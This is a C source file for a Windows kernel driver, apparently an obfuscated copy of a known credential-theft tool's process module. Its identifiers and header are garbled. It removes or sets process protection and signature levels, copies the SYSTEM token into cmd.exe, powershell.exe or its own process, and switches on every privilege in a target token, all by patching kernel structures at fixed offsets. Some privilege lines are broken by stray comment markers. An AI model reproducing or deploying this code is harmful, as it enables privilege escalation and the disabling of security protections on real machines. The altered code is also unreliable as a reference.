/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kkllclqlprocess.h"

const ULONG EPROCESS_OffSetTable[ceFdOsIndex_MAX][Eprocess_MAX] =
{					/*  EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect */
					/*  dt nt!_EPROCESS -n ActiveProcessLinks -n Flags2 -n SignatureLevel */
#if defined(_M_IX86)
/* UNK	*/	{0},
/* XP	*/	{0x0088},
/* 2K3	*/	{0x0098},
/* VISTA*/	{0x00a0, 0x0224, 0x0040},
/* 7	*/	{0x00b8, 0x026c, 0x0040},
/* 8	*/	{0x00b8, 0x00c0, 0x0040, 0x02d4},
/* BLUE	*/	{0x00b8, 0x00c0, 0x0040, 0x02cc},
/* 10_1507*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1511*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1607*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1703*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1709*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1803*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1809*/{0x00b8, 0x00c8, 0x0040, 0x02f4},
/* 10_1903*/{0x00b8, 0x00c8, 0x0040, 0x0364},
/* 10_1909*/{0x00b8, 0x00c8, 0x0040, 0x0364}, // ?
/* 10_2004*/{0x00e8, 0x00f8, 0x0040, 0x03a4},
#else
/* UNK	*/	{0},
/* XP	*/	{0},
/* 2K3	*/	{0x00e0},
/* VISTA*/	{0x00e8, 0x036c, 0x0040},
/* 7	*/	{0x0188, 0x043c, 0x0040},
/* 8	*/	{0x02e8, 0x02f8, 0x0040, 0x0648},
/* BLUE	*/	{0x02e8, 0x02f8, 0x0040, 0x0678},
/* 10_1507*/{0x02f0, 0x0300, 0x0040, 0x06a8},
/* 10_1511*/{0x02f0, 0x0300, 0x0040, 0x06b0},
/* 10_1607*/{0x02f0, 0x0300, 0x0040, 0x06c8},
/* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1903*/{0x02f0, 0x0308, 0x0040, 0x06f8},
/* 10_1909*/{0x02f0, 0x0308, 0x0040, 0x06f8}, // ?
/* 10_2004*/{0x0448, 0x0460, 0x0040, 0x0878},
#endif
};

NTSTATUS kkllclqlprocess_enum(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer, PKKLL_M_PROCESS_CALLBACK callback, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	for(
		pProcess = PsInitialSystemProcess;
		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][EprocessNext])) - EPROCESS_OffSetTable[ceFdOsIndex][EprocessNext]) != PsInitialSystemProcess;
		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][EprocessNext])) - EPROCESS_OffSetTable[ceFdOsIndex][EprocessNext])
		)
	{
		status = callback(szBufferIn, bufferIn, outBuffer, pProcess, pvArg);
	}
	return status;
}

NTSTATUS kkllclqlprocess_list_callback(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status;
	PJoAA_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;

	HANDLE processId = PsGetProcessId(pProcess);
	PCHAR processName = PsGetProcessImageFileName(pProcess);

	status = kprintf(outBuffer, L"%u\t%-14S", processId, processName);
	if(NT_SUCCESS(status))
	{
		if(ceFdOsIndex >= ceFdOsIndex_VISTA)
		{
			pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][EprocessFlags2]);
			status = kprintf(outBuffer, L"\t%s", (*pFlags2 & TOKEN_FROZEN_MASK) ? L"F-Tok" : L"     ");
			if(NT_SUCCESS(status))
			{
				if(ceFdOsIndex >= ceFdOsIndex_8)
				{
					pSignatureProtect = (PJoAA_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][SignatureProtect]);
					status = kprintf(outBuffer, L"\tSig %02x/%02x", pSignatureProtect->SignatureLevel, pSignatureProtect->SectionSignatureLevel);
					if(NT_SUCCESS(status) && (ceFdOsIndex > ceFdOsIndex_8))
						status = kprintf(outBuffer, L" [%1x-%1x-%1x]", pSignatureProtect->Protection.Type, pSignatureProtect->Protection.Audit, pSignatureProtect->Protection.Signer);
				}
				else if(*pFlags2 & PROTECTED_PROCESS_MASK)
				{
					status = kprintf(outBuffer, L"\tP-Proc");
				}
			}
		}
		if(NT_SUCCESS(status))
			kprintf(outBuffer, L"\n");
	}
	return status;
}

NTSTATUS kkllclqlprocess_protect(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer)
{
	NTSTATUS status;
	PEPROCESS pProcess = NULL;
	PJoAA_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;
	PMIMIDRV_PROCESS_PROTECT_INFORMATION pInfos = (PMIMIDRV_PROCESS_PROTECT_INFORMATION) bufferIn;

	if(ceFdOsIndex >= ceFdOsIndex_VISTA)
	{
		if(pInfos && (szBufferIn == sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION)))
		{
			status = PsLookupProcessByProcessId((HANDLE) pInfos->processId, &pProcess);
			if(NT_SUCCESS(status))
			{
				if(ceFdOsIndex < ceFdOsIndex_8)
				{
					pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][EprocessFlags2]);
					if(pInfos->SignatureProtection.SignatureLevel)
						*pFlags2 |= PROTECTED_PROCESS_MASK;
					else
						*pFlags2 &= ~PROTECTED_PROCESS_MASK;
				}
				else
				{
					pSignatureProtect = (PJoAA_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[ceFdOsIndex][SignatureProtect]);
					pSignatureProtect->SignatureLevel = pInfos->SignatureProtection.SignatureLevel;
					pSignatureProtect->SectionSignatureLevel = pInfos->SignatureProtection.SectionSignatureLevel;
					if(ceFdOsIndex > ceFdOsIndex_8)
						pSignatureProtect->Protection =  pInfos->SignatureProtection.Protection;
				}
				ObDereferenceObject(pProcess);
			}
		}
		else status = STATUS_INVALID_PARAMETER;
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}

NTSTATUS kkllclqlprocess_token(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PMIMIDRV_PROCESS_TOKEN_FROM_TO pTokenFromTo = (PMIMIDRV_PROCESS_TOKEN_FROM_TO) bufferIn;
	ULONG fromProcessId, toProcessId;
	HANDLE hFromProcess, hFromProcessToken;
	PEPROCESS pFromProcess = PsInitialSystemProcess, pToProcess = NULL;

	if(pTokenFromTo && (szBufferIn == sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO)))
	{
		if(pTokenFromTo->fromProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->fromProcessId, &pFromProcess);
		if(NT_SUCCESS(status) && pTokenFromTo->toProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->toProcessId, &pToProcess);
	}

	if(NT_SUCCESS(status))
	{
		status = ObOpenObjectByPointer(pFromProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hFromProcess);
		if(NT_SUCCESS(status))
		{
			status = ZwOpenProcessTokenEx(hFromProcess, 0, OBJ_KERNEL_HANDLE, &hFromProcessToken);
			if(NT_SUCCESS(status))
			{
				status = kprintf(outBuffer, L"Token from %u/%-14S\n", PsGetProcessId(pFromProcess), PsGetProcessImageFileName(pFromProcess));
				if(NT_SUCCESS(status))
				{
					if(pToProcess)
						status = kkllclqlprocess_token_toProcess(szBufferIn, bufferIn, outBuffer, hFromProcessToken, pToProcess);
					else
						status = kkllclqlprocess_enum(szBufferIn, bufferIn, outBuffer, kkllclqlprocess_systoken_callback, hFromProcessToken);
				}
				ZwClose(hFromProcessToken);
			}
			ZwClose(hFromProcess);
		}
	}

	if(pToProcess)
		ObDereferenceObject(pToProcess);

	if(pFromProcess && (pFromProcess != PsInitialSystemProcess))
		ObDereferenceObject(pFromProcess);

	return status;
}

NTSTATUS kkllclqlprocess_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PCHAR processName = PsGetProcessImageFileName(pProcess);

	if((RtlCompareMemory("miAquvwg.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
		status = kkllclqlprocess_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);

	return status;
}

NTSTATUS kkllclqlprocess_token_toProcess(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	PROCESS_ACCESS_TOKEN ProcessTokenInformation = {NULL, NULL};
	HANDLE hToProcess;
	PULONG pFlags2 = NULL;
	NTSTATUS status;
	HANDLE processId = PsGetProcessId(pToProcess);
	PCHAR processName = PsGetProcessImageFileName(pToProcess);

	status = ObOpenObjectByPointer(pToProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hToProcess);
	if(NT_SUCCESS(status))
	{
		status = ZwDuplicateToken(hSrcToken, 0, NULL, FALSE, TokenPrimary, &ProcessTokenInformation.Token);
		if(NT_SUCCESS(status))
		{
			if(ceFdOsIndex >= ceFdOsIndex_VISTA)
			{
				pFlags2 = (PULONG) (((ULONG_PTR) pToProcess) + EPROCESS_OffSetTable[ceFdOsIndex][EprocessFlags2]);
				if(*pFlags2 & TOKEN_FROZEN_MASK)
					*pFlags2 &= ~TOKEN_FROZEN_MASK;
				else
					pFlags2 = NULL;
			}

			status = ZwSetInformationProcess(hToProcess, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
			if(NT_SUCCESS(status))
				status = kprintf(outBuffer, L" * to %u/%-14S\n", processId, processName);
			else
				status = kprintf(outBuffer, L" ! ZwSetInformationProcess 0x%08x for %u/%-14S\n", status, processId, processName);

			if((ceFdOsIndex >= ceFdOsIndex_VISTA) && pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;

			ZwClose(ProcessTokenInformation.Token);
		}
		ZwClose(hToProcess);
	}
	return status;
}

NTSTATUS kkllclqlprocess_fullprivileges(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	PACCESS_TOKEN pAccessToken = NULL;
	PJoAA_NT6_PRIVILEGES pPrivileges;
	PULONG pPid = (PULONG) bufferIn;

	if(ceFdOsIndex >= ceFdOsIndex_VISTA)
	{
		if(pPid && (szBufferIn == sizeof(ULONG)))
			status = PsLookupProcessByProcessId((HANDLE) *pPid, &pProcess);
		else
			pProcess = PsGetCurrentProcess();

		if(NT_SUCCESS(status) && pProcess)
		{
			if(pAccessToken = PsReferencePrimaryToken(pProcess))
			{
				status = kprintf(outBuffer, L"All privileges for the access token from %u/%-14S\n", PsGetProcessId(pProcess), PsGetProcessImageFileName(pProcess));
				
				pPrivileges = (PJoAA_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[ceFdOsIndex][TokenPrivs]);
				pPrivileges->Present[0] = pPrivileges->Enabled[0] /*= pPrivileges->EnabledByDefault[0]*/ = 0xfc;
				pPrivileges->Present[1] = pPrivileges->Enabled[1] /*= pPrivileges->EnabledByDefault[1]*/ = //...0xff;
				pPrivileges->Present[2] = pPrivileges->Enabled[2] /*= pPrivileges->EnabledByDefault[2]*/ = //...0xff;
				pPrivileges->Present[3] = pPrivileges->Enabled[3] /*= pPrivileges->EnabledByDefault[3]*/ = 0xff;
				pPrivileges->Present[4] = pPrivileges->Enabled[4] /*= pPrivileges->EnabledByDefault[4]*/ = 0x0f;

				PsDereferencePrimaryToken(pAccessToken);
			}

			if(pProcess != PsGetCurrentProcess())
				ObDereferenceObject(pProcess);
		}
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}